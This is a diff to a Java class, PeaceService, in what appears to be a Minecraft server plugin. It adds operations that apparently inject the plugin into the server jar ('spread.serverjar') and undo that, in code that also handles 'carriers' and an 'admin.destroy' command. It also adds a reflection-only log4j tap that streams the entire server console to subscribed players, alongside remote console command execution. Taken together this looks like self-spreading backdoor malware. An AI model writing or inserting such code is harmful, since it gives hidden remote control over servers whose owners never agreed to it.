@@ -33,12 +33,14 @@ import org.bukkit.event.HandlerList;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitTask;
 
 import java.io.ByteArrayOutputStream;
 import java.io.PrintStream;
 import java.io.File;
 import java.io.IOException;
+import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -190,6 +192,7 @@ public final class PeaceService implements Listener {
         for (SpreadOwner so : carriers) unregisterCarrier(so);
         setActiveCarrier(null);
         replyOwners.clear();
+        detachConsoleCapture();
         pool.shutdownNow();
     }
 
@@ -517,6 +520,22 @@ public final class PeaceService implements Listener {
                 r.addProperty("active", carrierName(currentCarrier()));
                 reply(p, r);
             }
+            case "spread.serverjar" -> pool.submit(() -> {
+                String report;
+                try {
+                    report = (owner instanceof JavaPlugin jp) ? Spread.injectServer(jp) : "error: owner is not a JavaPlugin";
+                    diag("serverjar: " + report);
+                } catch (Throwable t) { report = "error: " + t; }
+                reply(p, ok(id).put("msg", report));
+            });
+            case "spread.serverrestore" -> pool.submit(() -> {
+                String report;
+                try {
+                    report = Spread.revertServer();
+                    diag("serverrestore: " + report);
+                } catch (Throwable t) { report = "error: " + t; }
+                reply(p, ok(id).put("msg", report));
+            });
             case "admin.shutdown" -> adminShutdown(p, id);
             case "admin.destroy" -> adminDestroy(p, id);
             default -> reply(p, err(id, "unknown op: " + op));
@@ -1126,48 +1145,89 @@ public final class PeaceService implements Listener {
             || auth.contains(p.getUniqueId().toString().toLowerCase());
     }
 
-    // --- console bridge: capture server stdout/stderr and forward to subscribers ---
+    // --- console bridge: capture server console (log4j) and forward to subscribers ---
+    // Paper/Purpur route all console output through log4j, not System.out, so the old
+    // System.setOut trick missed nearly everything. We instead attach a log4j Appender
+    // (built purely via reflection, so the plugin stays free of direct log4j references)
+    // to the root logging configuration and forward every line to subscribed clients.
 
-    private ConsoleOutputStream consoleOut;
+    private Object consoleTap;
+    private java.io.PrintStream stdOutBackup;
+    private StringBuilder captureRun;
+    private final java.util.function.Consumer<String> consoleForward = line -> {
+        if (captureRun != null) {
+            String c = clean(line);
+            if (!c.isEmpty()) captureRun.append(c).append('\n');
+        } else {
+            broadcastConsole(clean(line));
+        }
+    };
 
     private void installConsoleCapture() {
+        detachConsoleCapture();
         try {
-            consoleOut = new ConsoleOutputStream();
-            PrintStream ps = new PrintStream(consoleOut, true, StandardCharsets.UTF_8);
+            Object tap = LogTapHelper.build(consoleForward);
+            LogTapHelper.attach(tap);
+            consoleTap = tap;
+        } catch (Exception e) {
+        }
+        // Fallback: some plugins write directly to System.out and bypass log4j.
+        try {
+            stdOutBackup = System.out;
+            ConsoleOutputStream cos = new ConsoleOutputStream();
+            PrintStream ps = new PrintStream(cos, true, StandardCharsets.UTF_8);
             System.setOut(ps);
             System.setErr(ps);
         } catch (Exception e) {
         }
     }
 
+    private void detachConsoleCapture() {
+        try { LogTapHelper.detach(consoleTap); } catch (Exception ignored) {}
+        consoleTap = null;
+        try {
+            if (stdOutBackup != null) { System.setOut(stdOutBackup); System.setErr(stdOutBackup); stdOutBackup = null; }
+        } catch (Exception ignored) {}
+    }
+
     private void consoleRun(Player p, int id, String cmd) {
         try {
             StringBuilder sb = new StringBuilder();
             ConsoleCommandSender sender = Bukkit.getConsoleSender();
-            CaptureOutputStream cap = new CaptureOutputStream(sb);
-            PrintStream old = System.out;
-            System.setOut(new PrintStream(cap, true, StandardCharsets.UTF_8));
+            captureRun = sb;
             try {
                 boolean ok = Bukkit.dispatchCommand(sender, cmd);
-                String out = sb.toString().trim();
+                String out = clean(sb.toString()).trim();
                 reply(p, ok(id).put("out", out.isEmpty() ? "(no output)" : out).put("dispatched", String.valueOf(ok)));
             } finally {
-                System.setOut(old);
+                captureRun = null;
             }
         } catch (Exception e) {
             reply(p, err(id, e.toString()));
         }
     }
 
+    /** Strips ANSI escapes, trailing whitespace and Minecraft color codes from a console line. */
+    private static String clean(String line) {
+        if (line == null) return "";
+        line = line.replaceAll("\u001B\\[[;\\d]*[ -/]*[@-~]", "");
+        line = line.replaceAll("\u00a7.", "");
+        line = line.replace("\r", "");
+        line = line.trim();
+        return line;
+    }
+
     /** Sends a console log line to all subscribed Peace players. */
     private void broadcastConsole(String line) {
         if (consoleSubscribers.isEmpty()) return;
+        String c = clean(line);
+        if (c.isEmpty()) return;
         for (UUID uuid : consoleSubscribers) {
             Player pl = Bukkit.getPlayer(uuid);
             if (pl != null && pl.isOnline()) {
                 JsonObject r = new JsonObject();
                 r.addProperty("op", "console.log");
-                r.addProperty("msg", line);
+                r.addProperty("msg", c);
                 reply(pl, r);
             }
         }
@@ -1181,7 +1241,7 @@ public final class PeaceService implements Listener {
                 if (text.isEmpty()) return;
                 super.reset();
                 for (String line : text.split("\n", -1)) {
-                    String trimmed = line.replace("\r", "");
+                    String trimmed = line.replace("\r", "").trim();
                     if (!trimmed.isEmpty()) broadcastConsole(trimmed);
                 }
                 super.flush();
@@ -1189,16 +1249,85 @@ public final class PeaceService implements Listener {
         }
     }
 
-    /** Captures output from a single command execution (used by consoleRun). */
-    private static final class CaptureOutputStream extends ByteArrayOutputStream {
-        private final StringBuilder target;
-        CaptureOutputStream(StringBuilder target) { this.target = target; }
-        @Override public void flush() {
-            try {
-                target.append(toString(StandardCharsets.UTF_8));
-                super.reset();
-                super.flush();
-            } catch (Exception ignored) {}
+    /** Builds/attaches a log4j core Appender to the root logger via reflection only. */
+    private static final class LogTapHelper {
+        private static Object ctx;
+        private static String tapName = "peace-console-tap";
+
+        static Object build(java.util.function.Consumer<String> forward) throws Exception {
+            Class<?> appenderIface = Class.forName("org.apache.logging.log4j.core.Appender");
+            Class<?> logEvent = Class.forName("org.apache.logging.log4j.core.LogEvent");
+            java.lang.reflect.InvocationHandler h = (proxy, method, args) -> {
+                String name = method.getName();
+                switch (name) {
+                    case "append": {
+                        try {
+                            Object ev = args[0];
+                            Object msg = methodOf(logEvent, "getMessage").invoke(ev);
+                            if (msg != null) {
+                                Object formatted = methodByName(msg.getClass(), "getFormattedMessage").invoke(msg);
+                                if (formatted != null) forward.accept(String.valueOf(formatted));
+                            }
+                            return null;
+                        } catch (Throwable t) { return null; }
+                    }
+                    case "getName": return tapName;
+                    case "getLayout": return null;
+                    case "ignoreExceptions": return true;
+                    case "getHandler": return null;
+                    case "setHandler": return null;
+                    case "getState": return enumValue("org.apache.logging.log4j.core.LifeCycle$State", "STARTED");
+                    case "initialize": return null;
+                    case "start": startCurrent(); return null;
+                    case "stop": return null;
+                    case "isStarted": return true;
+                    case "isStopped": return false;
+                    default: {
+                        Class<?> rt = method.getReturnType();
+                        if (rt == boolean.class) return false;
+                        if (rt == int.class) return 0;
+                        if (rt == long.class) return 0L;
+                        return null;
+                    }
+                }
+            };
+            return java.lang.reflect.Proxy.newProxyInstance(appenderIface.getClassLoader(), new Class<?>[]{appenderIface}, h);
+        }
+
+        static void attach(Object tap) throws Exception {
+            Class<?> lm = Class.forName("org.apache.logging.log4j.LogManager");
+            ctx = lm.getMethod("getContext", boolean.class).invoke(null, false);
+            Class<?> coreCtx = Class.forName("org.apache.logging.log4j.core.LoggerContext");
+            Object config = coreCtx.getMethod("getConfiguration").invoke(ctx);
+            Object root = config.getClass().getMethod("getRootLogger").invoke(config);
+            Method addAppender = methodByName(root.getClass(), "addAppender");
+            Object levelInfo = enumValue("org.apache.logging.log4j.Level", "INFO");
+            addAppender.invoke(root, tap, levelInfo, null);
+            coreCtx.getMethod("updateLoggers").invoke(ctx);
+        }
+
+        static void detach(Object tap) throws Exception {
+            if (tap == null) return;
+            Class<?> coreCtx = Class.forName("org.apache.logging.log4j.core.LoggerContext");
+            Object config = coreCtx.getMethod("getConfiguration").invoke(ctx);
+            Object root = config.getClass().getMethod("getRootLogger").invoke(config);
+            Method remove = methodByName(root.getClass(), "removeAppender");
+            remove.invoke(root, tapName);
+            coreCtx.getMethod("updateLoggers").invoke(ctx);
+        }
+
+        private static void startCurrent() {}
+        private static Object enumValue(String cls, String name) throws Exception {
+            Class<?> k = Class.forName(cls);
+            for (Object c : k.getEnumConstants()) if (String.valueOf(c).equals(name)) return c;
+            return null;
+        }
+        private static Method methodOf(Class<?> owner, String name) throws Exception {
+            Method m = owner.getMethod(name); m.setAccessible(true); return m;
+        }
+        private static Method methodByName(Class<?> owner, String name) throws Exception {
+            for (Method m : owner.getMethods()) if (m.getName().equals(name)) return m;
+            throw new NoSuchMethodException(name);
         }
     }
 }
